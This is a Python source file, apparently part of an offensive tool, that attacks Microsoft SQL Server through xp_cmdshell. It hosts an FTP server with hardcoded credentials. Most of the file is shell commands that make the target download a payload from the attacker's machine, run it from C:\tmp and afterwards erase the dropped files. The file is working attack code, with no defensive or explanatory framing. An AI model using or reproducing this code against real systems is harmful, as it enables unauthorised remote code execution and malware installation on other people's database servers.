import os
import multiprocessing
import logging

import pymssql

from exploit.tools import get_interface_to_target
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer


__author__ = 'Maor Rayzin'


FTP_SERVER_PORT = 1026
FTP_SERVER_ADDRESS = ''
FTP_SERVER_USER = 'brute'
FTP_SERVER_PASSWORD = 'force'
FTP_WORKING_DIR = '.'

LOG = logging.getLogger(__name__)


class FTP(object):

    """Configures and establish an FTP server with default details.

        Args:
            user (str): User for FTP server auth
            password (str): Password for FTP server auth
            working_dir (str): The local working dir to init the ftp server on.

    """

    def __init__(self, user=FTP_SERVER_USER, password=FTP_SERVER_PASSWORD,
                 working_dir=FTP_WORKING_DIR):
        """Look at class level docstring."""

        self.user = user
        self.password = password
        self.working_dir = working_dir

    def run_server(self, user=FTP_SERVER_USER, password=FTP_SERVER_PASSWORD,
                   working_dir=FTP_WORKING_DIR):

        """ Configures and runs the ftp server to listen forever until stopped.

            Args:
                user (str): User for FTP server auth
                password (str): Password for FTP server auth
                working_dir (str): The local working dir to init the ftp server on.
        """

        # Defining an authorizer and configuring the ftp user
        authorizer = DummyAuthorizer()
        authorizer.add_user(user, password, working_dir, perm='elradfmw')

        # Normal ftp handler
        handler = FTPHandler
        handler.authorizer = authorizer

        address = (FTP_SERVER_ADDRESS, FTP_SERVER_PORT)

        # Configuring the server using the address and handler. Global usage in stop_server thats why using self keyword
        self.server = FTPServer(address, handler)

        # Starting ftp server, this server has no auto stop or stop clause, and also, its blocking on use, thats why I
        # multiproccess is being used here.
        self.server.serve_forever()

    def stop_server(self):
        # Stops the FTP server and closing all connections.
        self.server.close_all()


class AttackHost(object):
    """
        This class acts as an interface for the attacking methods class

        Args:
            payload_path (str): The local path of the payload file
    """

    def __init__(self, payload_path):
        self.payload_path = payload_path

    def send_payload(self):
        raise NotImplementedError("Send function not implemented")

    def execute_payload(self):
        raise NotImplementedError("execute function not implemented")


class CmdShellAttack(AttackHost):

    """
    This class uses the xp_cmdshell command execution and will work only if its available on the remote host.

        Args:
            payload_path (str): The local path of the payload file
            cursor (pymssql.conn.obj): A cursor object from pymssql.connect to run commands with.

    """

    def __init__(self, payload_path, cursor, dst_ip_address):
        super(CmdShellAttack, self).__init__(payload_path)
        self.ftp_server, self.ftp_server_p = self.__init_ftp_server()
        self.cursor = cursor
        self.attacker_ip = get_interface_to_target(dst_ip_address)

    def send_payload(self):
        """
            Sets up an FTP server and using it to download the payload to the remote host

            Return:
                True if payload sent False if not.
        """

        # Sets up the cmds to run
        shellcmd1 = """xp_cmdshell "mkdir c:\\tmp& chdir c:\\tmp& echo open {0} {1}>ftp.txt& \
        echo {2}>>ftp.txt" """.format(self.attacker_ip, FTP_SERVER_PORT, FTP_SERVER_USER)
        shellcmd2 = """xp_cmdshell "chdir c:\\tmp& echo {0}>>ftp.txt" """.format(FTP_SERVER_PASSWORD)

        shellcmd3 = """xp_cmdshell "chdir c:\\tmp& echo get {0}>>ftp.txt& echo bye>>ftp.txt" """\
            .format(self.payload_path)
        shellcmd4 = """xp_cmdshell "chdir c:\\tmp& cmd /c ftp -s:ftp.txt" """
        shellcmds = [shellcmd1, shellcmd2, shellcmd3, shellcmd4]

        # Checking to see if ftp server is up
        if self.ftp_server_p and self.ftp_server:

            try:
                # Running the cmd on remote host
                for cmd in shellcmds:
                    self.cursor.execute(cmd)
            except Exception as e:
                LOG.error('Error sending the payload using xp_cmdshell to host', exc_info=True)
                self.ftp_server_p.terminate()
                return False
            return True
        else:
            LOG.error("Couldn't establish an FTP server for the dropout")
            return False

    def execute_payload(self):

        """
            Executes the payload after ftp drop

            Return:
                True if payload was executed successfully, False if not.
        """

        # Getting the payload's file name
        payload_file_name = os.path.split(self.payload_path)[1]

        # Preparing the cmd to run on remote, using no_output so I can capture exit code: 0 -> success, 1 -> error.
        shellcmd = """DECLARE @i INT \
                      EXEC @i=xp_cmdshell "chdir C:\\& C:\\tmp\\{0}", no_output \
                      SELECT @i """.format(payload_file_name)

        try:
            # Executing payload on remote host
            LOG.debug('Starting execution process of payload: {0} on remote host'.format(payload_file_name))
            self.cursor.execute(shellcmd)
            if self.cursor.fetchall()[0][0] == 0:
                # Success
                self.ftp_server_p.terminate()
                LOG.debug('Payload: {0} execution on remote host was a success'.format(payload_file_name))
                return True
            else:
                LOG.warning('Payload: {0} execution on remote host failed'.format(payload_file_name))
                self.ftp_server_p.terminate()
                return False

        except pymssql.OperationalError:
            LOG.error('Executing payload: {0} failed'.format(payload_file_name), exc_info=True)
            self.ftp_server_p.terminate()
            return False

    def cleanup_files(self):
        """
            Cleans up the folder with the attack related files (C:\\tmp by default)
        :return: True or False if command executed or not.
        """
        cleanup_command = """xp_cmdshell "rd /s /q c:\\tmp" """
        try:
            self.cursor.execute(cleanup_command)
            LOG.info('Attack files cleanup command has been sent.')
            return True
        except Exception as e:
            LOG.error('Error cleaning the attack files using xp_cmdshell, files may remain on host', exc_info=True)
            return False

    def __init_ftp_server(self):
        """
            Init an FTP server using FTP class on a different process

            Return:
                ftp_s: FTP server object
                p: the process obj of the FTP object
        """

        try:
            ftp_s = FTP()
            multiprocessing.log_to_stderr(logging.DEBUG)
            p = multiprocessing.Process(target=ftp_s.run_server)
            p.start()
            LOG.debug('Successfully established an FTP server in another process: {0}, {1}'.format(ftp_s, p.name))
            return ftp_s, p
        except Exception as e:
            LOG.error('Exception raised while trying to pull up the ftp server', exc_info=True)
            return None, None
